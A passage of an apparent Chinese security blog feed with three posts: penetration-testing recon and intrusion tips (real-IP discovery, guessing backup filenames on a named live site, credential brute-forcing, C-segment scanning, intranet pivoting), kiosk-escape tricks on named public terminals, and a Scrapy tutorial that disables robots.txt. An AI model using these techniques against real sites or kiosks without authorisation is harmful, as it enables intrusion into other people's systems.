      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些渗透经验</title>
      <link href="/2021/09/23/%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C/"/>
      <url>/2021/09/23/%E4%B8%80%E4%BA%9B%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>渗透测试过程中的一些经验</p><h2 id="看网站是什么脚本？"><a href="#看网站是什么脚本？" class="headerlink" title="看网站是什么脚本？"></a>看网站是什么脚本？</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>网站根目录里<br> index.php<br> index.asp<br> index.aspx<br> index.jsp<br> index.do （jsp）</p><p>如果访问正常就说明 是属于哪一类的脚本程序</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用 google.com</p><p>如搜索 <a href="http://www.xx.com/">www.xx.com</a> aspx</p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>burpsuit爬虫</p><h3 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h3><p>目录扫描工具</p><h2 id="判断是否内网"><a href="#判断是否内网" class="headerlink" title="判断是否内网"></a>判断是否内网</h2><h3 id="首先要确认真实IP"><a href="#首先要确认真实IP" class="headerlink" title="首先要确认真实IP"></a>首先要确认真实IP</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h4><p>有的网站会记录网站历史IP 如站长之家之类的</p><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>找PHPinfo, asp之类的文件都会暴露服务器真实IP </p><h4 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h4><p>找二级域名有的管理不会把二级域名做cdn(看运气了)</p><h4 id="思路4"><a href="#思路4" class="headerlink" title="思路4"></a>思路4</h4><p>有的大型网站都有自己的邮件服务器注册之后，会主动发一封邮件给我们。。。 好吧。。打开邮件的源代码。。 你就能看到服务器的真实Ip了</p><h3 id="知道了IP-扫下开放端口"><a href="#知道了IP-扫下开放端口" class="headerlink" title="知道了IP 扫下开放端口"></a>知道了IP 扫下开放端口</h3><p>如果只开放http端口 其他什么端口都没开的（95%为内网）</p><p>如果开放了http端口跟FTP端口 其他什么端口都没开 （75%为内网）</p><p>如果开放了http端口跟FTP端口跟数据库端口 （55%为内网）</p><h2 id="判断服务器类型"><a href="#判断服务器类型" class="headerlink" title="判断服务器类型"></a>判断服务器类型</h2><h3 id="第一"><a href="#第一" class="headerlink" title="第一"></a>第一</h3><p> 直接ping服务器ip，看回显信息进行判断</p><p>TTL=32   9X/ME</p><p>TTL=64   linux</p><p>TTL=128  2000X/XP</p><p>TTL=255  UNIX</p><h3 id="第二"><a href="#第二" class="headerlink" title="第二"></a>第二</h3><p> 利用 御剑 wwwscan ScorpioScan 等工具</p><h2 id="网站目录"><a href="#网站目录" class="headerlink" title="网站目录"></a>网站目录</h2><p><code>robots.txt</code></p><p>对于<code>http://www.zzrsks.com.cn/wsbm2013/</code>，把2013改成2012,2011 2010. 看看存不存在</p><p>很多傻B管理员为了方便记主这些文件 把备份文件名改成 wsbm2013.rar, wsbm2013.7z, wsbm2013.zip 放在网站程序根目录里像这样：<a href="http://www.zzrsks.com.cn/wsbm2013/wsbm2013.rar">http://www.zzrsks.com.cn/wsbm2013/wsbm2013.rar</a></p><p>或者 wsbm.rar, wsbm1.rar, wsbmwsbm.rar </p><p>如果没有，我们再回到根目录<a href="http://www.zzrsks.com.cn/">http://www.zzrsks.com.cn/</a></p><p>把注意力转向到zzrsks这里<a href="http://www.zzrsks.com.cn/zzrsks">http://www.zzrsks.com.cn/zzrsks</a></p><p><a href="http://www.zzrsks.com.cn/webzzrsks">http://www.zzrsks.com.cn/webzzrsks</a><br><a href="http://www.zzrsks.com.cn/">http://www.zzrsks.com.cn/</a>** (管理员的QQ号 或者他的名字 如果目录没有 就试试备份文件后缀)</p><p><a href="http://www.zzrsks.com.cn/zzrsks.rar">http://www.zzrsks.com.cn/zzrsks.rar</a>, <a href="http://www.zzrsks.com.cn/webzzrsks.rar">http://www.zzrsks.com.cn/webzzrsks.rar</a> </p><h2 id="检测目标站"><a href="#检测目标站" class="headerlink" title="检测目标站"></a>检测目标站</h2><p>我们知道了他开放3个http端口80, 8081, 8083</p><h3 id="先从默认80端口安全检测"><a href="#先从默认80端口安全检测" class="headerlink" title="先从默认80端口安全检测"></a>先从默认80端口安全检测</h3><h4 id="检测SQL漏洞"><a href="#检测SQL漏洞" class="headerlink" title="检测SQL漏洞"></a>检测SQL漏洞</h4><p>经典注入 静态注入 登陆框注入 搜索框注入 等</p><h4 id="检测越权漏洞"><a href="#检测越权漏洞" class="headerlink" title="检测越权漏洞"></a>检测越权漏洞</h4><p>文件拦截跳转 后台文件直接打开直接添加管理员 等</p><h4 id="检测XSS漏洞"><a href="#检测XSS漏洞" class="headerlink" title="检测XSS漏洞"></a>检测XSS漏洞</h4><p>先来个反射型XSS，看看过滤严不严，如果过滤了什么符号，就想办法绕过去来XSS跨站等备份，或者直接拿shell。PS：如果不精通XSS的朋友们 就盲打吧= = 看看收获点什么</p><h4 id="检测上传漏洞"><a href="#检测上传漏洞" class="headerlink" title="检测上传漏洞"></a>检测上传漏洞</h4><p>注册会员啊，扫目录看看存不存在FCK 或者 eWebEditor上传页面，如果有eWebEditor上传页面的话，就利用对应的0day进行一次上传</p><h4 id="测试其他漏洞"><a href="#测试其他漏洞" class="headerlink" title="测试其他漏洞"></a>测试其他漏洞</h4><p>比如用google搜索敏感信息，比如txt, bak什么的，我记得我就有1次利用GOOGLE爆了目标站的root密码</p><h3 id="如果失败就换下一个端口"><a href="#如果失败就换下一个端口" class="headerlink" title="如果失败就换下一个端口"></a>如果失败就换下一个端口</h3><p>假设为8081端口，<a href="http://www.xx.com:8081/">www.xx.com:8081/</a><br>然后我们用程序指纹来扫是属于哪里的cms，到是哪里的cms后，进行0day exp 利用。</p><h4 id="如果扫不出来-怎么办呢？"><a href="#如果扫不出来-怎么办呢？" class="headerlink" title="如果扫不出来 怎么办呢？"></a>如果扫不出来 怎么办呢？</h4><p>没关系，还可以试试另外一种方法。</p><p>打开网站后随便打开一个网站程序文件，如：<a href="http://www.x.com/xindong/kkks.aspx">www.x.com/xindong/kkks.aspx</a><br>那么在google那里 搜索一下（利用google 语句 如：intitle:   inurl：  intext: Filetype: Site：等等的语句）xindong/kkks.aspx   文件</p><blockquote><p>site:xx.com inurl:admin</p><p>site:xx.com intext:用户名</p></blockquote><p>然后查找敏感信息  PS：运气好 还可以找到这程序的下载源码</p><p>我们搜索了从google那里发现了一个公司站 ，目录跟文件跟目标站是一模一样的，我们也可以拿下那个公司站，拿下后把源码打包，然后挖掘0day</p><h4 id="在google搜不到怎么办？"><a href="#在google搜不到怎么办？" class="headerlink" title="在google搜不到怎么办？"></a>在google搜不到怎么办？</h4><p>第一：这程序是私人写的 没公布<br>解决方法：只能慢慢安全检测了</p><p>第二：这程序目录 文件夹名 文件名 被改了<br>解决方法：查看原代码 搜索一段代码，或者利用google搜索他的CSS、JS文件 </p><h3 id="如果端口都没有漏洞"><a href="#如果端口都没有漏洞" class="headerlink" title="如果端口都没有漏洞"></a>如果端口都没有漏洞</h3><p>只能爆破了 组合好强大的字典 进行爆破 http后台 FTP MYSQL MSSQL 等等端口</p><h3 id="傻瓜式渗透"><a href="#傻瓜式渗透" class="headerlink" title="傻瓜式渗透"></a>傻瓜式渗透</h3><p>比如<a href="http://www.x.com的一个站,先爬行得到他的目录/">www.x.com的一个站，先爬行得到他的目录</a></p><p><a href="http://www.x.com/1">www.x.com/1</a><br><a href="http://www.x.com/2">www.x.com/2</a><br><a href="http://www.x.com/3">www.x.com/3</a><br>先记录下来，然后把你组合的强大字典 ASPX ASP PHP JSP 4类程序，全部拉在一起，一起扫描</p><p>先扫描网站根目录，再次得到一些你不知道的目录</p><p><a href="http://www.x.com/1mn">www.x.com/1mn</a><br><a href="http://www.x.com/xindong">www.x.com/xindong</a></p><p>然后又记录下来，然后跟爬行得出的目录放在一起</p><p><a href="http://www.x.com/1">www.x.com/1</a><br><a href="http://www.x.com/2">www.x.com/2</a><br><a href="http://www.x.com/3">www.x.com/3</a><br><a href="http://www.x.com/1mn">www.x.com/1mn</a><br><a href="http://www.x.com/xindong">www.x.com/xindong</a></p><p>然后把重复的内容去掉，然后放在进去扫描目录，然后又得出新目录跟文件<br><a href="http://www.x.com/1/xss/">www.x.com/1/xss/</a><br><a href="http://www.x.com/2/qqww/">www.x.com/2/qqww/</a><br><a href="http://www.x.com/3/asdasd/">www.x.com/3/asdasd/</a><br><a href="http://www.x.com/1mn/ssaq/">www.x.com/1mn/ssaq/</a><br><a href="http://www.x.com/xindong/admin.asp">www.x.com/xindong/admin.asp</a><br>然后又把<br><a href="http://www.x.com/1/xss/">www.x.com/1/xss/</a><br><a href="http://www.x.com/2/qqww/">www.x.com/2/qqww/</a><br><a href="http://www.x.com/3/asdasd/">www.x.com/3/asdasd/</a><br><a href="http://www.x.com/1mn/ssaq/">www.x.com/1mn/ssaq/</a><br>再次进行扫描，相信大家都理解了吧</p><blockquote><p>之前利用傻瓜式 丢在服务器里跑 结果发现个备份文件，下载打开一看发现是sa用户跟密码<br>PS：如果发现密码不对，可以用这个密码，去试试登录FTP、服务器、后台什么的，或者再次利用这个密码来组合密码字典来爆破</p></blockquote><h2 id="网站无能为力，尝试C段"><a href="#网站无能为力，尝试C段" class="headerlink" title="网站无能为力，尝试C段"></a>网站无能为力，尝试C段</h2><h3 id="怎么找内网C段"><a href="#怎么找内网C段" class="headerlink" title="怎么找内网C段"></a>怎么找内网C段</h3><p>第一 通过二级域名来渗透（一般都是同网关的 我试过）</p><p>第二 用御剑扫描C段 比如网站IP是*.*.4.156，而网站的标题是：学籍管理，那么就扫描*.*.3.1 ~ *.*.5.254 的80 81 8080 8081端口，看哪个开放，然后分析，看哪个标题比较敏感，比如内部登录系统或者教师登录 什么的，然后拿下他的shell</p><p>如果支持命令，先不要急着提权，先看看同不同网关，直接在shell cmd命令里扫描整个内网端口 <code>netstat -an | find &quot; &quot;</code></p><p>主要扫3个目标站已开的端口 80 8081 8083，如果某个IP 这3个端口都开了 80%同网关，然后进去就可以内网渗透了</p><p>如果内网渗透不成功 就内网嗅探</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>收集信息→目标站渗透→开放端口渗透→旁站渗透→C段渗透</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有趣的终端机绕过</title>
      <link href="/2021/09/23/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/23/%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>自助终端机采用的触摸屏的方式，用户点触计算机显示屏上的文字或图片就能实现对主机操作。这些自助终端机很多都是基于windows平台的，通常是采用将程序的窗口最大化，始终置前，隐藏系统桌面的方式，使用户只能在当前应用下操作，不能逃逸。</p><h2 id="通过特定操作，使程序报错"><a href="#通过特定操作，使程序报错" class="headerlink" title="通过特定操作，使程序报错"></a>通过特定操作，使程序报错</h2><p>由于终端机通常是触控的，有时通过构造特定的错误操作，或频繁的点击等方式使程序报错，或造成内存爆满，从而弹出错误信息，而此时通过出错信息能找到入口。当然让程序报错的方式各种各样，要灵活发现，有的甚至直接进入桌面。</p><h3 id="中国移动话费充值终端机"><a href="#中国移动话费充值终端机" class="headerlink" title="中国移动话费充值终端机"></a>中国移动话费充值终端机</h3><p>输入错误的手机号，并点击忘记密码，程序报错，同时右下角出现语言栏提示，点击提示即可调用本地资源管理器，从而进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f2.png"></p><h3 id="双流机场查询系统终端"><a href="#双流机场查询系统终端" class="headerlink" title="双流机场查询系统终端"></a>双流机场查询系统终端</h3><p>频繁点击屏幕，通常是多点多次触控，使程序响应不过来，进而崩溃，进入桌面</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f3.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f4.png"></p><h3 id="中国电信自助服务终端"><a href="#中国电信自助服务终端" class="headerlink" title="中国电信自助服务终端"></a>中国电信自助服务终端</h3><p>输入错误信息，使程序报错，右下角弹出语言栏，进一步利用从而进入本地资源管理器</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f6.png"></p><h2 id="通过右键菜单"><a href="#通过右键菜单" class="headerlink" title="通过右键菜单"></a>通过右键菜单</h2><p>通常是因为没有屏蔽右键菜单或者一些敏感选项。长按某一位置，几秒后弹出右键菜单选项，通常通过右键菜单的一些选项，比如“属性”、“打印机设置”、“另存为”、“打印”、“关于”之类的选项进行利用。另存为则直接弹出windows资源管理器，然后继续右键，选择资源管理器，找到osk.exe和taskmgr.exe，结束相关进程，从而进入桌面系统</p><h3 id="白云机场免费上网终端"><a href="#白云机场免费上网终端" class="headerlink" title="白云机场免费上网终端"></a>白云机场免费上网终端</h3><p>未屏蔽敏感右键菜单，点出右键菜单后，有目标另存为、属性等众多敏感选项，从而调出资源管理器进入桌面</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f7.png"></p><h3 id="中国移动自助营业终端机"><a href="#中国移动自助营业终端机" class="headerlink" title="中国移动自助营业终端机"></a>中国移动自助营业终端机</h3><p>通过右键菜单，选择添加打印机，一步步找到本地资源管理器，从而进一步进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f8.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f9.png"></p><h3 id="自动售药机"><a href="#自动售药机" class="headerlink" title="自动售药机"></a>自动售药机</h3><p>通过右键，找到关于信息，然后一步步调出资源管理器，进一步进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f10.png"></p><h3 id="图书馆一终端查询机"><a href="#图书馆一终端查询机" class="headerlink" title="图书馆一终端查询机"></a>图书馆一终端查询机</h3><p>仔细寻找发现一处右键可以进行“打印预览”的选项，从而通过打印预览进入桌面系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f11.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f12.png"></p><h2 id="通过页面的一些调用本地程序的按钮"><a href="#通过页面的一些调用本地程序的按钮" class="headerlink" title="通过页面的一些调用本地程序的按钮"></a>通过页面的一些调用本地程序的按钮</h2><p>比如“打印按钮”、“发邮件”、“安装程序按钮”、“帮助链接”等等。通常程序会调用本地浏览器或软件，从而进行利用利用</p><h3 id="图书馆一查询设备"><a href="#图书馆一查询设备" class="headerlink" title="图书馆一查询设备"></a>图书馆一查询设备</h3><p>调出“打印预览”</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f13.png"></p><p>点击“帮助信息”调用本地浏览器。从而用多种方法进入桌面系统。此处选择“工具-internet选项-浏览历史记录-设置-查看文件”然后打开屏幕键盘和任务管理器。</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f14.png"></p><h3 id="中关村地下购物广场终端"><a href="#中关村地下购物广场终端" class="headerlink" title="中关村地下购物广场终端"></a>中关村地下购物广场终端</h3><p>通过发送邮件按钮，调出outlook，进而可以调用本地资源管理器，从而进入系统</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f15.png"></p><h2 id="通过输入法、屏幕键盘、快捷键等方法"><a href="#通过输入法、屏幕键盘、快捷键等方法" class="headerlink" title="通过输入法、屏幕键盘、快捷键等方法"></a>通过输入法、屏幕键盘、快捷键等方法</h2><p>很多终端有时因为错误，或者设置问题会直接显示输入法。通常可以通过右键输入法等找到资源管理器。有的拼音输入法直接显示出来，有的可以直接利用。而输入法有时，比如qq输入法、搜狗输入法通常都可以调用本地浏览器等等</p><h3 id="邮政自助终端机"><a href="#邮政自助终端机" class="headerlink" title="邮政自助终端机"></a>邮政自助终端机</h3><p>按快捷键CTRL+S 调出资源管理器，进行进一步利用</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f16.png"></p><h3 id="通过输入法绕过"><a href="#通过输入法绕过" class="headerlink" title="通过输入法绕过"></a>通过输入法绕过</h3><p>点击帮助，出现提示，找不到文件。然后就调用打开了资源管理器了</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f17.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f18.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/terminal-bypass/bypass-f19.png"></p><h2 id="可以物理接触终端机的电源线、网线的情况下"><a href="#可以物理接触终端机的电源线、网线的情况下" class="headerlink" title="可以物理接触终端机的电源线、网线的情况下"></a>可以物理接触终端机的电源线、网线的情况下</h2><p>在可以物理接触终端机的情况下，可以将电源拔掉，然后终端机重启。当出来桌面时候，快速的点击开始-程序-启动。将启动栏目的程序删掉。然后继续重启，默认的重启后不会调用原有的程序（当然是针对没有还原系统的终端机来说，很多都是没有的），从而进入桌面系统；</p><p>可以直接拔掉网线，程序有时会弹出错误提示，从而进一步操作进入终端机</p><p>可以在重新插拔电源后进行</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>进入触屏界面后该如何操作？调出资源管理器，然后调出最基本的几个程序。进入c:\windows\system32\目录下。一般先打开osk.exe，此为屏幕键盘程序； taskmgr.exe任务管理器，用来结束相应的程序；cmd.exe用来执行命令。接下来判断所处的网络环境，进行进一步的内网渗透了。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 终端机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python-spider3</title>
      <link href="/2021/09/21/python-spider3/"/>
      <url>/2021/09/21/python-spider3/</url>
      
        <content type="html"><![CDATA[<p><code>scrapy</code></p><h2 id="create-project-file"><a href="#create-project-file" class="headerlink" title="create project file"></a>create project file</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token operator">></span>scrapy startproject scrapydemoNew Scrapy project <span class="token string">'scrapydemo'</span>, using template directory <span class="token string">'f:\python39\lib\site-packages\scrapy\templates\project'</span>, created in:    E:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token punctuation">\</span>scrapydemoYou can start your first spider with:    <span class="token builtin class-name">cd</span> scrapydemo    scrapy genspider example example.comE:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token operator">></span>cd qsbkE:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token punctuation">\</span>qsbk<span class="token operator">></span>scrapy genspider demo <span class="token string">"qiushibaike.com"</span>Created spider <span class="token string">'demo'</span> using template <span class="token string">'basic'</span> <span class="token keyword">in</span> module:  qsbk.spiders.demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>demo</code>即为爬虫的名字</p><h2 id="some-configuration-before-spider"><a href="#some-configuration-before-spider" class="headerlink" title="some configuration before spider"></a>some configuration before spider</h2><p>将<code>settings.py</code>中的<code>ROBOTSTXT_OBEY</code>设置为<code>False</code>，即不遵循robots协议</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Obey robots.txt rules</span>ROBOTSTXT_OBEY <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置<code>UA</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">DEFAULT_REQUEST_HEADERS <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span><span class="token punctuation">,</span>  <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'en'</span><span class="token punctuation">,</span>  <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4655.6 Safari/537.36'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="meaning-of-files-in-the-project"><a href="#meaning-of-files-in-the-project" class="headerlink" title="meaning of files in the project"></a>meaning of files in the project</h2><p><code>item.py</code> - 设置要爬取的字段</p><p><code>pipelines.py</code> - 设置保存爬取内容</p><p><code>settings.py</code> - 设置文件，如User-Agent</p><h2 id="execute-the-spider"><a href="#execute-the-spider" class="headerlink" title="execute the spider"></a>execute the spider</h2><ol><li><p>cmd </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>python-project<span class="token punctuation">\</span>spider-project<span class="token punctuation">\</span>qsbk<span class="token operator">></span>scrapy crawl demo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在<code>qsbk</code>中新建<code>start.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> scrapy <span class="token keyword">import</span> cmdlinecmdline<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"scrapy crawl demo"</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="coding-get-糗事百科段子"><a href="#coding-get-糗事百科段子" class="headerlink" title="coding - get 糗事百科段子"></a>coding - get 糗事百科段子</h2><p><code>demo.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy<span class="token keyword">from</span> qsbk<span class="token punctuation">.</span>items <span class="token keyword">import</span> QsbkItem<span class="token keyword">class</span> <span class="token class-name">DemoSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'demo'</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'qiushibaike.com'</span><span class="token punctuation">]</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://www.qiushibaike.com/text/page/1/'</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        divs <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="content"]/div/div[2]/div'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> each <span class="token keyword">in</span> divs<span class="token punctuation">:</span>            author <span class="token operator">=</span> each<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./div[1]/a[2]/h2/text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>author<span class="token punctuation">)</span>            content <span class="token operator">=</span> each<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a[1]/div/span//text()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getall<span class="token punctuation">(</span><span class="token punctuation">)</span>            content <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            item <span class="token operator">=</span> QsbkItem<span class="token punctuation">(</span>author<span class="token operator">=</span>author<span class="token punctuation">,</span> content<span class="token operator">=</span>content<span class="token punctuation">)</span>            <span class="token comment"># 将数据移交给pipelines处理</span>            <span class="token keyword">yield</span> item        next_url <span class="token operator">=</span> response<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//ul[@class="pagination"]/li[last()]/a/@href'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> next_url<span class="token punctuation">:</span>            <span class="token keyword">return</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span><span class="token string">"https://www.qiushibaike.com/"</span><span class="token operator">+</span>next_url<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>items.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Define here the models for your scraped items</span><span class="token comment">#</span><span class="token comment"># See documentation in:</span><span class="token comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><span class="token keyword">import</span> scrapy<span class="token keyword">class</span> <span class="token class-name">QsbkItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># define the fields for your item here like:</span>    <span class="token comment"># name = scrapy.Field()</span>    author <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>pipelines.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Define your item pipelines here</span><span class="token comment">#</span><span class="token comment"># Don't forget to add your pipeline to the ITEM_PIPELINES setting</span><span class="token comment"># See: https://docs.scrapy.org/en/latest/topics/item-pipeline.html</span><span class="token comment"># useful for handling different item types with a single interface</span><span class="token keyword">from</span> itemadapter <span class="token keyword">import</span> ItemAdapter<span class="token keyword">from</span> scrapy<span class="token punctuation">.</span>exporters <span class="token keyword">import</span> JsonLinesItemExporter<span class="token keyword">class</span> <span class="token class-name">QsbkPipeline</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"duanzi.json"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exporter <span class="token operator">=</span> JsonLinesItemExporter<span class="token punctuation">(</span>self<span class="token punctuation">.</span>fp<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token comment"># 启动爬虫时调用的函数</span>    <span class="token keyword">def</span> <span class="token function">open_spider</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token comment"># 当有item传过来时被调用</span>    <span class="token keyword">def</span> <span class="token function">process_item</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> item<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>exporter<span class="token punctuation">.</span>export_item<span class="token punctuation">(</span>item<span class="token punctuation">)</span>        <span class="token keyword">return</span> item    <span class="token comment"># 爬虫完成时调用的函数</span>    <span class="token keyword">def</span> <span class="token function">close_spider</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 